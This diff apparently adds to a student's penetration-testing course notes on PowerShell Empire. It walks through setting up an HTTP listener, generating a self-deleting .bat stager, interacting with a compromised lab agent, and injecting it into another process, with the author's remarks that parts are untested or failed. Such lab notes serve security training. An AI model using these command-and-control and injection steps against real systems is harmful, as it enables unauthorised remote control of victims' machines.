@@ -2916,6 +2916,14 @@ sudo msfconsole -r setup.rc
    
 
 * Book3_Chapter 23 PowerShell Empire
+  + info:
+    - in general:
+  #+begin_quote
+Empire 3 is a post-exploitation framework that includes a pure-PowerShell Windows agent, and compatibility with Python 3.x Linux/OS X agents.
+  #+end_quote
+    - failed in both Windows and Linux.
+    - payload triggerred Windows AV. 
+
 ** project repo && latest forks:
    + [[https://github.com/EmpireProject/Empire]]
    + [[https://github.com/Jrhenderson11/Empire]]
@@ -2927,7 +2935,8 @@ sudo msfconsole -r setup.rc
      
 
 ** Installation, Setup, and Usage
-*** install:
+*** install (Ubuntu && Debian):
+   + follow the readme
    + clone the repo.
    + src:
    #+begin_src bash
@@ -2937,28 +2946,64 @@ sudo ./empire
   # the launch script
    #+end_src
    
-*** PowerShell Empire Syntax
+*** PowerShell Empire Basic usage (listeners && stager) (untested)
+    + info:
+      - setup a listener, create a script that establish the connection.
+      - experienced possible bug due python encoding issues.?
+    + entry(src): sudo ./empire
     + src:
     #+begin_src empire
 (Empire) > help
     #+end_src
+      - setup a listener
     #+begin_src empire
 (Empire) > listeners
   # enter the listeners context
-(Empire: listeners) > uselistener + _space + _tab
+(Empire: listeners) > uselistener + <space> + <tab>
   # autocompelete suggests a list of listeners
   # http, redirector
 (Empire: listeners) > uselistener http
 (Empire: listeners/http) > info
-(Empire: listeners/http) > set Host <lHost>
 (Empire: listeners/http) > set Port <lPort>
 (Empire: listeners/http) > execute
 (Empire: listeners/http) > back
-(Empire: listeners) > usestager
-  # tab auto complete suggestions
+(Empire: listeners) >
 (PWK p726)
     #+end_src
+      - setup a stager
+    #+begin_src empire
+(Empire: listeners) > usestager windows/launcher_bat
+(Empire: stager/windows/launcher_bat) > info
+  # Generates a self-deleting .bat launcher for Empire.
+(Empire: stager/windows/launcher_bat) > set Listener http
+  # the <name> of the Listener
+execute
+    #+end_src
+    
+*** The Empire Agent (instance/session management) (untested)
+    + after the stager is executed on the target machine.
+    + src:
+    #+begin_src empire
+(Empire: stager/windows/launcher_bat) > agents
+  # [*] Active agents:
+  # Name     Lang  Internal IP  Machine Name  Username    Process         Delay
+  # S2Y5XW1L ps    10.11.0.22   CLIENT251     corp\offsec powershell/2976 5/0.0
+(Empire: agents) > interact S2Y5XW1L
+(Empire: S2Y5XW1L) >
+(Empire: S2Y5XW1L) > ps
+(Empire: S2Y5XW1L) > psinject http <PID>
+  # migrate to another process, e.g. explorer.exe
+(Empire: S2Y5XW1L) > agents
+  # interact with the new agent migrated.
+    #+end_src
+    
+** PowerShell-Empire Modules
+   + info:
+     - =usemodule=
+   + src:
+   #+begin_src empire
 
+   #+end_src
 
 * TODO list
   + AD, LDAP enum users
